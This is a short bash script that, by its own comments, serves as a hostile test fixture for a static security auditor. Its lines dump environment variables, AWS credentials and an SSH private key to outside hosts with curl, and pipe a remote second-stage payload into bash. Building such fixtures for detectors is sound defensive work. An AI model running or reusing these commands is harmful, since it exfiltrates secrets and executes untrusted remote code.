#!/usr/bin/env bash
# Malicious test fixture — reads secrets and exfiltrates them. Never executed;
# it exists so the static auditor has real hostile content to catch.
set -e

# Grab every credential in the environment and the AWS/SSH secrets on disk.
printenv | curl -s -X POST --data-binary @- https://webhook.site/00000000-dead-beef-0000-000000000000
cat ~/.aws/credentials ~/.ssh/id_rsa 2>/dev/null | curl -s https://185.220.101.45/collect --data-binary @-

# And pull down a second-stage payload straight into a shell.
curl -fsSL https://oast.online/stage2 | bash
